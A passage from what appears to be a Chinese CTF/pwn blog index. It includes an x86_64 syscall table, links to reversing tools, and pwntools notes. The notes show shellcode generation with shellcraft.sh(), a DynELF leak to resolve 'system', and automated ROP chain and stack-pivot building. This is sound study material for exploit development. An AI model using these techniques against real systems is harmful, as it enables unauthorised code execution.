class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_mknod 133</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_uselib 134</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_personality 135</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_ustat 136</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_statfs 137</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_fstatfs 138</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_sysfs 139</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_getpriority 140</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_setpriority 141</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_sched_setparam 142</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_sched_getparam 143</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_sched_setscheduler 144</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_sched_getscheduler 145</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_sched_get_priority_max 146</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_sched_get_priority_min 147</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_sched_rr_get_interval 148</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_mlock 149</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_munlock 150</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_mlockall 151</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_munlockall 152</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_vhangup 153</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_modify_ldt 154</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_pivot_root 155</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR__sysctl 156</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_prctl 157</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_arch_prctl 158</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_adjtimex 159</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_setrlimit 160</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_chroot 161</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_sync 162</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_acct 163</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_settimeofday 164</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_mount 165</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_umount2 166</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_swapon 167</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_swapoff 168</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_reboot 169</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_sethostname 170</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_setdomainname 171</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_iopl 172</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_ioperm 173</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_create_module 174</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_init_module 175</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_delete_module 176</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_get_kernel_syms 177</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_query_module 178</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_quotactl 179</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_nfsservctl 180</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_getpmsg 181</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_putpmsg 182</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_afs_syscall 183</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_tuxcall 184</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_security 185</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_gettid 186</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_readahead 187</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_setxattr 188</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_lsetxattr 189</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_fsetxattr 190</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_getxattr 191</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_lgetxattr 192</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_fgetxattr 193</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_listxattr 194</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_llistxattr 195</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_flistxattr 196</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_removexattr 197</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_lremovexattr 198</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_fremovexattr 199</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_tkill 200</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_time 201</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_futex 202</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_sched_setaffinity 203</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_sched_getaffinity 204</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_set_thread_area 205</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_io_setup 206</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_io_destroy 207</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_io_getevents 208</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_io_submit 209</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_io_cancel 210</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_get_thread_area 211</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_lookup_dcookie 212</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_epoll_create 213</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_epoll_ctl_old 214</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_epoll_wait_old 215</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_remap_file_pages 216</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_getdents64 217</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_set_tid_address 218</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_restart_syscall 219</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_semtimedop 220</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_fadvise64 221</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_timer_create 222</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_timer_settime 223</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_timer_gettime 224</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_timer_getoverrun 225</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_timer_delete 226</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_clock_settime 227</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_clock_gettime 228</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_clock_getres 229</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_clock_nanosleep 230</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_exit_group 231</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_epoll_wait 232</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_epoll_ctl 233</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_tgkill 234</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_utimes 235</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_vserver 236</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_mbind 237</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_set_mempolicy 238</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_get_mempolicy 239</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_mq_open 240</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_mq_unlink 241</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_mq_timedsend 242</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_mq_timedreceive 243</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_mq_notify 244</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_mq_getsetattr 245</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_kexec_load 246</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_waitid 247</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_add_key 248</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_request_key 249</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_keyctl 250</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_ioprio_set 251</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_ioprio_get 252</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_inotify_init 253</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_inotify_add_watch 254</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_inotify_rm_watch 255</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_migrate_pages 256</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_openat 257</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_mkdirat 258</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_mknodat 259</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_fchownat 260</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_futimesat 261</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_newfstatat 262</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_unlinkat 263</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_renameat 264</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_linkat 265</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_symlinkat 266</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_readlinkat 267</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_fchmodat 268</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_faccessat 269</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_pselect6 270</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_ppoll 271</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_unshare 272</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_set_robust_list 273</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_get_robust_list 274</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_splice 275</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_tee 276</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_sync_file_range 277</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_vmsplice 278</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_move_pages 279</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_utimensat 280</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_epoll_pwait 281</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_signalfd 282</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_timerfd_create 283</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_eventfd 284</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_fallocate 285</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_timerfd_settime 286</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_timerfd_gettime 287</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_accept4 288</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_signalfd4 289</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_eventfd2 290</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_epoll_create1 291</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_dup3 292</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_pipe2 293</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_inotify_init1 294</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_preadv 295</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_pwritev 296</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_rt_tgsigqueueinfo 297</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_perf_event_open 298</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_recvmmsg 299</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_fanotify_init 300</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_fanotify_mark 301</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_prlimit64 302</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_name_to_handle_at 303</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_open_by_handle_at 304</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_clock_adjtime 305</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_syncfs 306</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_sendmmsg 307</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_setns 308</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_getcpu 309</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_process_vm_readv 310</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_process_vm_writev 311</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_kcmp 312</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_finit_module 313</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_sched_setattr 314</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_sched_getattr 315</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_renameat2 316</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_seccomp 317</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_getrandom 318</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_memfd_create 319</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_kexec_file_load 320</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_bpf 321</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_execveat 322</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_userfaultfd 323</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_membarrier 324</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_mlock2 325</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_copy_file_range 326</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_preadv2 327</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_pwritev2 328</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">endif</span> <span class=\"comment\">/* _ASM_X86_UNISTD_64_H */</span></span></span><br></pre></td></tr></table></figure>\n<h3><span id=\"5tools\">5）tools</span></h3><h6><span id=\"1seccomp-tools\">1）seccomp-tools</span></h6><p><a href=\"https://github.com/david942j/seccomp-tools【查看seccomp禁用了什么系统调用】\">https://github.com/david942j/seccomp-tools【查看seccomp禁用了什么系统调用】</a></p>\n<h6><span id=\"2scyllahide\">2）scyllahide</span></h6><p><a href=\"https://github.com/x64dbg/ScyllaHide\">https://github.com/x64dbg/ScyllaHide</a></p>\n<h6><span id=\"3ollydump\">3）ollydump</span></h6><p><a href=\"https://www.52pojie.cn/thread-785387-1-1.html\">https://www.52pojie.cn/thread-785387-1-1.html</a></p>\n<p>elf</p>\n<h6><span id=\"4文件dump内存信息\">4）文件dump内存信息。</span></h6><p><a href=\"https://blog.csdn.net/qq_36119192/article/details/96474833\">https://blog.csdn.net/qq_36119192/article/details/96474833</a></p>\n<p><img src=\"/Users/rin/Library/Application Support/typora-user-images/image-20210530174645013.png\" alt=\"image-20210530174645013\"></p>\n<p>unicorn engine</p>\n<h6><span id=\"5capstone\">5）capstone</span></h6><p><a href=\"https://github.com/aquynh/capstone\">https://github.com/aquynh/capstone</a></p>\n<h6><span id=\"6qemu_stastic_x64\">6）qemu_stastic_x64</span></h6><p><a href=\"https://github.com/multiarch/qemu-user-static\">https://github.com/multiarch/qemu-user-static</a></p>\n<h6><span id=\"7angr\">7）angr</span></h6><p><a href=\"https://github.com/angr\">https://github.com/angr</a></p>\n<h3><span id=\"6pwntools组件\">6）pwntools组件</span></h3><h5><span id=\"1pwntools指定glibc版本\">1）pwntools指定glibc版本</span></h5><h6><span id=\"获取不同版本glibc\">获取不同版本glibc</span></h6><p><a href=\"https://mirrors.tuna.tsinghua.edu.cn/ubuntu/pool/main/g/glibc/\">https://mirrors.tuna.tsinghua.edu.cn/ubuntu/pool/main/g/glibc/</a></p>\n<p>pwntools加载。</p>\n<figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span> *</span><br><span class=\"line\">context.log_level=<span class=\"string\">&quot;debug&quot;</span></span><br><span class=\"line\">sh = process([<span class=\"string\">&quot;./lib00/lib/x86_64-linux-gnu/ld-2.31.so&quot;</span>, <span class=\"string\">&quot;./hello&quot;</span>],env=&#123;<span class=\"string\">&quot;LD_PRELOAD&quot;</span>:<span class=\"string\">&quot;./lib00/lib/x86_64-linux-gnu/libc.so.6&quot;</span>&#125;)</span><br><span class=\"line\"></span><br><span class=\"line\">pwnlib.gdb.attach(sh)</span><br><span class=\"line\">sh.interactive()</span><br></pre></td></tr></table></figure>\n<h5><span id=\"2基本模块\">2）基本模块</span></h5><h6><span id=\"1asmshellcraft\">1）asm/shellcraft</span></h6><p> 汇编与反汇编，支持x86/x64/arm/mips/power pc等基本上所有的主流平台</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"code\"><pre><span class=\"line\">asm(shellcraft.sh())</span><br><span class=\"line\">shellcraft.amd64.sh()</span><br></pre></td></tr></table></figure>\n<h6><span id=\"2dynelf\">2）dynelf</span></h6><figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">#example:</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">leak</span>():</span></span><br><span class=\"line\">  payload = p64(addr)</span><br><span class=\"line\">  p.send(payload)</span><br><span class=\"line\">  data = p.recv()</span><br><span class=\"line\">  log.info(<span class=\"string\">&quot;leaking: 0x%x --&gt; %s&quot;</span> % (addr, (data <span class=\"keyword\">or</span> <span class=\"string\">&#x27;&#x27;</span>).encode(<span class=\"string\">&#x27;hex&#x27;</span>)))</span><br><span class=\"line\">   <span class=\"keyword\">return</span> data</span><br><span class=\"line\"></span><br><span class=\"line\">d = DynELF(leak,elf = elf)</span><br><span class=\"line\">system  = d.lookup(<span class=\"string\">&#x27;system&#x27;</span>,<span class=\"string\">&#x27;libc&#x27;</span>)</span><br></pre></td></tr></table></figure>\n<h6><span id=\"3gdb\">3）gdb</span></h6><p> : 配合gdb进行调试，设置断点之后便能够在运行过程中直接调用GDB断下，类似于设置为即使调试JIT</p>\n<h6><span id=\"5memleak\">5）memleak</span></h6><p>: 用于内存泄漏</p>\n<h6><span id=\"5rop\">5）rop</span></h6><p>【<a href=\"https://www.jianshu.com/p/0d45e2025d97?utm_campaign=maleskine&amp;utm_content=note&amp;utm_medium=seo_notes&amp;utm_source=recommendation】\">https://www.jianshu.com/p/0d45e2025d97?utm_campaign=maleskine&amp;utm_content=note&amp;utm_medium=seo_notes&amp;utm_source=recommendation】</a></p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">In [59]: rop.</span><br><span class=\"line\">rop.base                   rop.elfs                   rop.leave                  rop.resolve</span><br><span class=\"line\">rop.build                  rop.find_gadget            rop.migrate                rop.search</span><br><span class=\"line\">rop.call                   rop.find_stack_adjustment  rop.migrated               rop.search_iter</span><br><span class=\"line\">rop.chain                  rop.from_blob              rop.pivots                 rop.setRegisters</span><br><span class=\"line\">rop.describe               rop.gadgets                rop.raw                    rop.unresolve</span><br><span class=\"line\">rop.dump                   rop.generatePadding        rop.regs                   </span><br></pre></td></tr></table></figure>\n<p><code>rop = ROP（&#39;main&#39;)</code></p>\n<p><code>ROP([ELF(&#39;./main&#39;)])</code>创建rop对象</p>\n<p><code>rop.raw</code>:添加数据</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">rop.raw(b<span class=\"string\">&quot;a&quot;</span>*10)</span><br></pre></td></tr></table></figure>\n<p><code>rop.dump</code>会将已经构建的栈数据输出,而且方便阅读</p>\n<p><code>rop.call</code></p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">rop.call(<span class=\"string\">&#x27;read&#x27;</span>,[1,2,3])</span><br><span class=\"line\"><span class=\"built_in\">print</span> rop.dump()</span><br><span class=\"line\">0x0000:           <span class=\"string\">&#x27;aaaa&#x27;</span> <span class=\"string\">&#x27;aaaaaaaaaa&#x27;</span></span><br><span class=\"line\">0x0004:           <span class=\"string\">&#x27;aaaa&#x27;</span></span><br><span class=\"line\">0x0008:           <span class=\"string\">&#x27;aaaa&#x27;</span></span><br><span class=\"line\">0x000c:        0x80483a0 <span class=\"built_in\">read</span>(1, 2, 3)</span><br><span class=\"line\">0x0010:           <span class=\"string\">&#x27;eaaa&#x27;</span> &lt;<span class=\"built_in\">return</span> address&gt;</span><br><span class=\"line\">0x0014:              0x1 arg0</span><br><span class=\"line\">0x0018:              0x2 arg1</span><br><span class=\"line\">0x001c:              0x3 arg2</span><br></pre></td></tr></table></figure>\n<p>第一个参数为目标函数符号名,第二个参数是个list,作为目标函数的参数.然后构建出数据拼接到已有的数据中<br>或者使用rop.read(1,2,3):效果和call一样.细心点可以发现前一个read后的返回地址改成了栈调整的数据.rop模块会自动寻找gadget来连接上2次功能调用</p>\n<p><code>rop.migrate</code>括号直接接地址。</p>\n<p>具体操作</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">#rop.migrate(2)</span></span><br><span class=\"line\"><span class=\"comment\">#print rop.dump()</span></span><br><span class=\"line\">0x0034:        0x804861b pop ebp; ret</span><br><span class=\"line\">0x0038:             -0x2</span><br><span class=\"line\">0x003c:        0x8048458 leave; ret</span><br></pre></td></tr></table></figure>\n<p>相当于自动化地实现了栈迁移。（pwntools yyds）</p>\n<p><code>rop.chain</code>返回当前所有rop chain的shellcode值。</p>\n","categories":["Binary_security"],"tags":["mess"]},{"title":"汇编小知识点","url":"/2021/10/13/sum_%E6%B1%87%E7%BC%96%E5%9F%BA%E7%A1%80/","content":"<link rel=\"stylesheet\" class=\"aplayer-secondary-style-marker\" href=\"/assets/css/APlayer.min.css\"><script src=\"/assets/js/APlayer.min.js\" class=\"aplayer-secondary-script-marker\"></script><script class=\"meting-secondary-script-marker\" src=\"/assets/js/Meting.min.js\"></script><p>​    \n    <div id=\"aplayer-mbBZtoJh\" class=\"aplayer aplayer-tag-marker meting-tag-marker\" data-id=\"1844479015\" data-server=\"netease\" data-type=\"song\" 